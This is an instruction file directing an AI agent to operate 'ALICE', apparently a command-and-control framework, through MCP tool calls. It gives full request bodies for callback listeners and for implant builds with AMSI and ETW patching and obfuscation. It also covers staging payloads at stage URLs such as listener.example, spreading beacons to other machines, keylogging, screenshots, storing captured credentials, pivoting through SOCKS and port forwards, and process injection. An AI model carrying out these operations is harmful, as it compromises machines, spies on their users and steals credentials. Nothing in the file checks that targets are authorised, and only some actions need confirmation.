---
name: alice-mcp
description: >-
  Calls ALICE MCP tools (alice_*) to operate sessions, listeners, terminal,
  explorer, processes, implants, file server, SOCKS, port forward, credentials,
  AliceScripts, reports, IOCs, queue, screenshots, keylogger, logs, notifications,
  and auth check. Use when the user wants anything done through the alice MCP
  server or a alice_* tool.
---

# ALICE MCP tools

Call `alice_*` tools only. JSON-body tools accept a JSON **object or string**.
Match `server/core/schemas` exactly. Do not invent fields. Do not omit required
fields. `status` other than `success` is failure, show `message` and stop.

Tags from list payloads are 3-32 alphanumeric (usually 6). Implant tools need
`host_tag` except `alice_terminal_help` and `alice_auth_*`. Confirm before
`delete_*`, `kill`, build, listener create, SOCKS/port-forward, credential
write, script enable. Do not echo `bytes`, `content_base64`, or credential
`content`. Commands ≤8192 chars. Binary ≤50 MiB. Long-poll tools block.

`alice_list_sessions`: for a snapshot pass `mode=default` and
`long_polling=false` (default `true` hangs).

## Where the target connects

Default assumption: implant callbacks, stage downloads, and file-server
fetches go **target → listener** (HTTP/HTTPS `channel` or `file_server`) at
that listener's IP and port. This MCP agent is a control client. It is not
the C2 endpoint. If the agent is in a container or on another network and
sees no inbound from the implant, that is expected, do not loop retrying
as if traffic were supposed to arrive here.

Exceptions exist (relay between implants, operator-chosen redirect, lab
where target and listener share a host, custom channel). If the operator
gives a different callback address, use that. Do not treat "never the
agent" as a hard block; treat "usually the listener" as the first place to
look (`alice_list_listeners`) when filling `config.servers` or stage URLs.

`listener_body.host` / `portToOpen` are the team-server bind. Implant
`servers` are whatever the **target** must reach, typically that listener
as the target sees it, unless the operator says otherwise. SOCKS and
port-forward usually bind on the team server the same way.

To move a beacon onto other machines, a `file_server` listener can host the
implant artifact. Create or reuse that listener, upload the build with
`alice_file_server_upload`, then give the target the file-server URL (same
host:port the listener binds, as that host sees it). Loader `servers` stage
URLs often point at that file. A `channel` listener is still what the
running implant callbacks to; the file server is only the drop. Other
transfer paths (explorer, terminal upload) remain valid when the operator
wants them.

## Tool map

| Intent | Tool |
| --- | --- |
| Auth | `alice_auth_check`, `alice_auth_login_info` |
| Sessions | `alice_list_sessions`, `alice_patch_session`, `alice_delete_session` |
| Listeners | `alice_list_listeners`, `alice_create_listener`, `alice_delete_listener` |
| Terminal | `alice_terminal_command`, `alice_terminal_help`, `alice_terminal_command_with_file`, `alice_terminal_upload_raw`, `alice_terminal_download` |
| Explorer | `alice_explorer_list`, `alice_explorer_download_file` |
| Process | `alice_list_processes` |
| Screenshot | `alice_screenshot_get` (capture via terminal `screenshot` / `screenshot start`) |
| Keylogger | `alice_keylogger_list`, `alice_keylogger_delete` (start/stop via terminal) |
| File server | `alice_file_server_list\|download\|upload\|rename\|delete` (`listener_tag`) |
| Implant / AES | `alice_build_implant`, `alice_create_aes_key` |
| Network | `alice_list_network`, `alice_create_socks_network`, `alice_create_port_forward_network`, `alice_restart_network`, `alice_delete_network` |
| Credentials | `alice_list_credentials`, `alice_create_credential`, `alice_patch_credential`, `alice_delete_credential` |
| Scripts | `alice_list_scripts`, `alice_create_script`, `alice_patch_script`, `alice_delete_script`, `alice_fetch_nsoutput` |
| Agents | `alice_list_agents`, `alice_post_agent`, `alice_patch_agent`, `alice_delete_agent` |
| Queue / IOC / logs | `alice_queue_list`, `alice_queue_delete`, `alice_list_iocs`, `alice_delete_ioc`, `alice_list_logs` |
| Notifications | `alice_list_notifications`, `alice_list_custom_notifications` |
| Reports | `alice_list_reports`, `alice_create_report`, `alice_download_report`, `alice_view_report`, `alice_delete_report` |

Specialized over terminal: explorer for dirs, `alice_list_processes` for tree,
file-server tools for listener files. Terminal `download` returns NDJSON
metadata, not bytes. Implant-to-implant `relay` is a terminal command.

# Bodies

JSON-body tools: `alice_create_listener` (`listener_body`),
`alice_build_implant` (`implant_body`), `alice_post_agent` (`agent_body`),
`alice_patch_agent` (`config_body`), `alice_patch_script` (`patch_body`).
Other tools take fields; the JSON below is what hits the API.

## `alice_create_listener` → `listener_body`

Discriminator `type`: `create` | `restart`. Create discriminator `listenerType`:
`channel` | `file_server`.

### create channel (all fields)

```json
{
  "type": "create",
  "listenerType": "channel",
  "name": "primary-http",
  "host": "0.0.0.0",
  "portToOpen": 8443,
  "channelPayload": "http",
  "port": 8443,
  "endpointPath": "/beacon",
  "longPollingMode": false,
  "implantBodyType": "off",
  "implantBody": "",
  "listenerResponse": "",
  "responseHeaders": [{ "key": "Server", "value": "nginx" }],
  "cert": {
    "enabled": false,
    "source": "self_signed",
    "certPem": null,
    "keyPem": null
  }
}
```

| Field | Type | Required | Constraint |
| --- | --- | --- | --- |
| `type` | `"create"` | yes | |
| `listenerType` | `"channel"` | yes | |
| `name` | string | yes | min 1 |
| `host` | string | yes | min 1. Bind on the team server (`0.0.0.0` = that machine) |
| `portToOpen` | int | yes | 1-65535. Typical callback port the target hits |
| `channelPayload` | `"http"` \| `"https"` | no | default `http` |
| `port` | int \| null | no | 1-65535 |
| `endpointPath` | string \| null | no | |
| `longPollingMode` | bool | no | default `false` |
| `implantBodyType` | `"off"` \| `"custom"` \| `"json"` \| `"xml"` \| null | no | |
| `implantBody` | string \| null | no | |
| `listenerResponse` | string \| null | no | may include `§content§` |
| `responseHeaders` | `{key, value}[]` \| null | no | key/value min 1 |
| `cert` | object \| null | https | |
| `cert.enabled` | bool | no | default `false` |
| `cert.source` | `"manual"` \| `"self_signed"` \| null | no | |
| `cert.certPem` | string \| null | manual | |
| `cert.keyPem` | string \| null | manual | |

HTTPS: `channelPayload=https` and `cert.enabled=true`. Manual needs both PEMs.

### create file_server (all fields)

```json
{
  "type": "create",
  "listenerType": "file_server",
  "name": "files-01",
  "host": "0.0.0.0",
  "portToOpen": 8080,
  "ssl": false,
  "port": 8080,
  "responseHeaders": [{ "key": "Server", "value": "Apache" }],
  "cert": {
    "enabled": false,
    "source": "self_signed",
    "certPem": null,
    "keyPem": null
  }
}
```

| Field | Type | Required | Constraint |
| --- | --- | --- | --- |
| `type` | `"create"` | yes | |
| `listenerType` | `"file_server"` | yes | |
| `name` | string | yes | min 1 |
| `host` | string | yes | min 1. Bind on the team server |
| `portToOpen` | int | yes | 1-65535. Typical port the target uses to fetch files/stages |
| `ssl` | bool | no | default `false` |
| `port` | int \| null | no | 1-65535 |
| `responseHeaders` | `{key, value}[]` \| null | no | |
| `cert` | object \| null | when `ssl` | same `CertConfig` as channel |

### restart

```json
{ "type": "restart", "tag": "a1b2c3" }
```

`tag` min 1, 3-32 alphanumeric (MCP `validate_host_tag`).

## `alice_build_implant` → `implant_body`

Discriminator `implant_base`: `stageless` | `loader`. `type` must be `"build"`.
`config` required.

### stageless (all `config` fields)

```json
{
  "type": "build",
  "implant_base": "stageless",
  "config": {
    "operational_system": "windows",
    "cpu": "amd",
    "arch": "x64",
    "format": "exe",
    "protocol": "http",
    "servers": { "0": "listener.example:8443" },
    "sleep": "2",
    "delay": "20",
    "second_delay": "",
    "syscall_method": "indirect",
    "sleep_mask": "off",
    "string_obfuscation": "xor",
    "etw_patch": "off",
    "amsi_patch": "off",
    "pe_headers_patch": "off",
    "show_conhost": "off",
    "api_resolution": "dynamic",
    "exe_icon": { "name": "app.ico", "bytes": "<base64>" },
    "body_content": {
      "type": "off",
      "request_body": null,
      "response_body": null,
      "cookies": [{ "key": "sid", "value": "1" }],
      "headers": [{ "key": "User-Agent", "value": "Mozilla/5.0" }]
    },
    "smb_pipe": null,
    "custom_channel": null,
    "custom_http_relay": null,
    "preface": null,
    "create_pe_strings": null,
    "pe_timestamp": { "lo": 0, "hi": 0 },
    "pe_major_linker_version": null,
    "pe_minor_linker_version": null,
    "pe_major_os_version": null,
    "pe_minor_os_version": null,
    "pe_major_image_version": null,
    "pe_minor_image_version": null,
    "pe_major_subsystem_version": null,
    "pe_minor_subsystem_version": null,
    "donut_entropy": null,
    "donut_compress": null,
    "donut_headers": null,
    "donut_exit": null,
    "donut_thread": null,
    "shellcode_encoder": "off"
  }
}
```

Omit null optionals if unused. Do not send `exe_icon` / PE / donut keys unless
the format allows them.

### loader (all `config` fields)

Same `config` keys as stageless except: `protocol` is `"http"` | `"custom"`;
`servers` are **stage URLs**; **no** `body_content`, `smb_pipe`,
`custom_http_relay`.

```json
{
  "type": "build",
  "implant_base": "loader",
  "config": {
    "operational_system": "windows",
    "cpu": "amd",
    "arch": "x64",
    "format": "exe",
    "protocol": "http",
    "servers": { "0": "http://listener.example:8080/stage.bin" },
    "sleep": "2",
    "delay": "20",
    "second_delay": "",
    "syscall_method": "indirect",
    "sleep_mask": "off",
    "string_obfuscation": "xor",
    "etw_patch": "off",
    "amsi_patch": "off",
    "pe_headers_patch": "off",
    "show_conhost": "off",
    "api_resolution": "dynamic",
    "exe_icon": null,
    "preface": null,
    "create_pe_strings": null,
    "pe_timestamp": null,
    "pe_major_linker_version": null,
    "pe_minor_linker_version": null,
    "pe_major_os_version": null,
    "pe_minor_os_version": null,
    "pe_major_image_version": null,
    "pe_minor_image_version": null,
    "pe_major_subsystem_version": null,
    "pe_minor_subsystem_version": null,
    "donut_entropy": null,
    "donut_compress": null,
    "donut_headers": null,
    "donut_exit": null,
    "donut_thread": null,
    "shellcode_encoder": "off",
    "custom_channel": null
  }
}
```

### implant `config` constraints

| Field | Type | Default | Constraint |
| --- | --- | --- | --- |
| `operational_system` | `windows\|linux\|macos` | required | |
| `cpu` | `amd\|arm` | required | windows → `amd` |
| `arch` | `x64\|x86` | required | windows → `x64` |
| `format` | see row | required | win `exe\|dll\|shellcode`; linux `elf\|so`; macos `app` |
| `protocol` | see base | required | stageless `http\|https\|smb\|tcp\|custom`; loader `http\|custom` |
| `servers` | `{index: string}` | `{}` | ≥1 endpoint for http/https/tcp; loader: stage URLs. Not for smb/custom. Usually the listener as the **target** reaches it (`host:port` or file-server URL). Confirm with the operator if it should differ |
| `sleep` | string | `"2"` | seconds |
| `delay` | string | `"20"` | seconds |
| `second_delay` | string | `""` | |
| `syscall_method` | `"indirect"` | `"indirect"` | |
| `sleep_mask` | `off\|timer\|zilean` | `"off"` | |
| `string_obfuscation` | `off\|xor\|rc4` | `"xor"` | |
| `etw_patch` | `on\|off` | `"off"` | |
| `amsi_patch` | `on\|off` | `"off"` | |
| `pe_headers_patch` | `on\|off` | `"off"` | |
| `show_conhost` | `on\|off` | `"off"` | windows `exe` only |
| `api_resolution` | `"dynamic"` | `"dynamic"` | |
| `exe_icon` | `{name, bytes}` | null | `exe` only; both min 1 |
| `body_content` | object | null | stageless **http/https only**; forbidden on loader |
| `body_content.type` | `off\|custom\|json\|xml` | required if set | if not `off`: `request_body` and `response_body` required non-empty |
| `body_content.request_body` | string \| null | | |
| `body_content.response_body` | string \| null | | |
| `body_content.cookies` | `{key, value}[]` \| null | | |
| `body_content.headers` | `{key, value}[]` \| null | | |
| `smb_pipe` | string \| null | | required if protocol `smb`; windows only; forbidden otherwise and on loader |
| `custom_channel` | string \| null | | required if protocol `custom`; user-supplied source only |
| `custom_http_relay` | string \| null | | custom protocol only; forbidden on loader |
| `preface` | string \| null | | Nim (win/linux) or Go (macos) |
| `create_pe_strings` | string \| null | | `exe\|dll\|shellcode` only |
| `pe_timestamp` | `{lo: int, hi: int}` | null | PE formats only |
| `pe_*_version` | int 0-65535 \| null | | PE formats only (linker/os/image/subsystem major+minor) |
| `donut_entropy` | `none\|random\|encrypt` | null | `shellcode` only |
| `donut_compress` | `none\|aplib` | null | `shellcode` only |
| `donut_headers` | `overwrite\|keep` | null | `shellcode` only |
| `donut_exit` | `thread\|process\|block` | null | `shellcode` only |
| `donut_thread` | bool \| null | | `shellcode` only |
| `shellcode_encoder` | `off\|sgn\|supernova` | null | non-`off` → windows only |

Relay implant = stageless + `protocol` `tcp` or `smb`. Save `bytes`. AES create
redacts `aesKey`.

## `alice_post_agent` → `agent_body`

Discriminator `type`: `create` | `usage`.

### create (full `config`)

```json
{
  "type": "create",
  "config": {
    "name": "ops-llm",
    "type": "deepseek",
    "apiKey": "",
    "endpoint": "",
    "headers": [{ "key": "Authorization", "value": "Bearer KEY" }],
    "bodyTemplate": "",
    "responseField": ""
  }
}
```

| Field | Type | Default | Constraint |
| --- | --- | --- | --- |
| `config.name` | string | required | min 1 |
| `config.type` | `deepseek\|custom` | `deepseek` | |
| `config.apiKey` | string | `""` | |
| `config.endpoint` | string | `""` | |
| `config.headers` | `{key, value}[]` | `[]` | key/value min 1 |
| `config.bodyTemplate` | string | `""` | |
| `config.responseField` | string | `""` | |

### usage

```json
{
  "type": "usage",
  "model": "deepseek-v4-pro",
  "id": "a1b2c3",
  "message": "summarize this host",
  "context": [{ "role": "user", "content": "prior" }],
  "system_prompt": "",
  "use_full_context": false
}
```

| Field | Type | Required |
| --- | --- | --- |
| `model` | string min 1 | yes |
| `id` | string min 1 | yes (agent tag) |
| `message` | string min 1 | yes |
| `context` | `{role, content}[]` | no, default `[]` |
| `system_prompt` | string | no, default `""` |
| `use_full_context` | bool (strict) | no, default `false` |

## `alice_patch_agent` → `config_body`

```json
{
  "config": {
    "name": "ops-llm",
    "type": "custom",
    "apiKey": "",
    "endpoint": "https://api.example.com/v1/chat/completions",
    "headers": [{ "key": "Authorization", "value": "Bearer KEY" }],
    "bodyTemplate": "{\"model\":\"x\",\"messages\":[]}",
    "responseField": "choices.0.message.content"
  }
}
```

Same `AgentConfig` as create. MCP also accepts a bare config object (no
`config` wrapper) if `name` is at the top level, it wraps to `{config: ...}`.

## `alice_create_script` fields → POST body

```json
{
  "name": "on-new-host",
  "content": "def on_new_host(row):\n    echo(row[\"tag\"])\n\nevent.new_host:on_new_host()\n",
  "description": ""
}
```

`name` min 1, `content` min 1 (not whitespace-only), `description` default `""`.

## `alice_patch_script` → `patch_body`

```json
{
  "name": "",
  "content": "def on_new_host(row):\n    echo(row[\"tag\"])\n\nevent.new_host:on_new_host()\n",
  "description": "",
  "status": 1
}
```

| Field | Type | Rule |
| --- | --- | --- |
| `name` | string | default `""` |
| `content` | string \| null | **required** unless `status` is set; not whitespace-only |
| `description` | string | default `""` |
| `status` | `0` \| `1` \| null | not bool; `"0"`/`"1"` ok. `1` enable, `0` disable |

## `alice_delete_script`

Path `script_tag`. Body: `{ "content": "" }` (optional confirmation string,
max 1_000_000 chars).

## Credentials

`alice_create_credential` / `alice_patch_credential` (patch also needs
`credential_tag`):

```json
{
  "name": "local-admin",
  "server": "ts-1",
  "host": "a1b2c3",
  "content": "hash-or-password",
  "desc": "optional"
}
```

`name`, `server`, `host`, `content` required. MCP maps tool `description` →
`desc` and omits `desc` when empty. `content` is not redacted.

## Reports, `alice_create_report` → POST body

Tool args: `name`, `report_type`, `file_type="pdf"`, `description=""`,
`host_tags=""` (CSV or list), `hide_credentials=false`.

```json
{
  "name": "eng-1",
  "description": "",
  "reportType": "activity",
  "fileType": "pdf",
  "hostTags": ["a1b2c3"],
  "hideCredentials": false
}
```

`reportType`: `activity` | `hosts` | `ioc`. `fileType`: `pdf` | `html` | `json`
(default `pdf`). `hostTags` list of strings. `hideCredentials` JSON bool.
Report tags for download/view/delete: `[\w.-]+`.

## Network

Worker builds these bodies. Ports 1-65535.

SOCKS (`alice_create_socks_network`):

```json
{
  "type": "create",
  "networkType": "socks",
  "portToOpen": 1080,
  "hostTag": "a1b2c3",
  "authUser": "",
  "authPass": ""
}
```

Port forward (`alice_create_port_forward_network`). `protocol` only `"tcp"`.

```json
{
  "type": "create",
  "networkType": "port_forwarding",
  "portToOpen": 2222,
  "hostTag": "a1b2c3",
  "forwardHost": "10.0.0.8",
  "forwardPort": 22,
  "protocol": "tcp"
}
```

Restart (`alice_restart_network` `connection_id` → `id`):

```json
{ "type": "restart", "id": "<connection_id>" }
```

## Terminal (worker-built)

`source_terminal` is always `mcp_stdio`.

`alice_terminal_command`:

```json
{ "command": "whoami", "host_tag": "a1b2c3", "source_terminal": "mcp_stdio" }
```

`alice_terminal_help` (`section` `help`|`armory`): no `host_tag`.

```json
{ "command": "help", "source_terminal": "mcp_stdio" }
```

`alice_terminal_command_with_file`:

```json
{
  "command": "upload -f payload.exe -o C:/Temp/payload.exe",
  "host_tag": "a1b2c3",
  "source_terminal": "mcp_stdio",
  "__tmp_file_bytes__": "<base64>"
}
```

`alice_terminal_upload_raw`: same meta as JSON, body = raw bytes,
header `x-terminal-meta`.

`alice_terminal_download`:

```json
{
  "command": "download C:/Temp/file.bin /tmp/file.bin",
  "host_tag": "a1b2c3",
  "source_terminal": "mcp_stdio",
  "download_id": "mcp-<12 hex>",
  "download_file": "file.bin"
}
```

`command` aliases: `input`. `host_tag` aliases: `host`, `tag`, `hostTag`,
`session`. Help/armory skip host. Built-ins: `help`, `config`, `delay`, `kill`,
`tasks`, `pwd`, `cd`, `ls`, `cat`, `echo`, `cp`, `mv`, `rm`, `mkdir`, `rmdir`,
`whoami`, `systeminfo`, `env`, `tasklist`, `enumdrives`, `ifconfig`, `route`,
`arp`, `netstat`, `portscan`, `shell`, `powershell`, `shellcode`, `bof`,
`dotnet`, `spawn`, `inj`, `tokens`, `relay`, `keylogger start|stop`,
`screenshot` / `start` / `stop`, `armory`, `upload`, `download`.

## Explorer / process / session patch / file-server rename

`alice_explorer_list` → `{ "host": "<tag>", "path": "/", "getContent": false, "autoRefresh": false }`

`alice_explorer_download_file` → `{ "host": "<tag>", "path": "/full/file", "getContent": true, "autoRefresh": false, "fileName": "file" }`
(`path` not empty/`/`; `fileName` required)

`alice_list_processes` → `{ "host": "<tag>" }`

`alice_patch_session` → `{ "notes": "" }` (max 65535)

`alice_file_server_rename` → `{ "new_file_name": "basename-only" }`

## Queries (list tools)

Sessions: `mode` `default|graphs|sessions_lp`, `long_polling` bool (default
true; **false for snapshot**; ignored for `sessions_lp`).

Screenshot GET: `hash`, `longPolling=true` optional.

Keylogger: `search`, `hostTag` default `all`, `date`, `timeFrom`, `timeTo`,
`page` ≥1, `pageSize` 1-500.

Queue: `search`, `hostTag` default `all`, `page`, `pageSize` 1-500.

IOCs: `search`, `hostTags` list (MCP `host_tags_csv`), `page`, `pageSize` 1-500.

Logs: `search`, `logType` default `all`, `category` default `all`, `page`,
`pageSize` 1-500.

## Errors

| Failure | Action |
| --- | --- |
| MCP disabled / missing key / 401 | Return tool text. Do not guess credentials |
| `host_tag must be 3-32 alphanumeric` | Re-list; use `tag` |
| timeout / empty terminal | `alice_queue_list` + session `delay` |
| nsoutput long-poll timed out | Retry only if a script should have printed |
| download exceeds 50 MiB | Smaller file |
| port in use | list listeners + network, other port |
| implant validation (`format`/`smb_pipe`/`servers`/`body_content`) | Fix `config` to the table above |
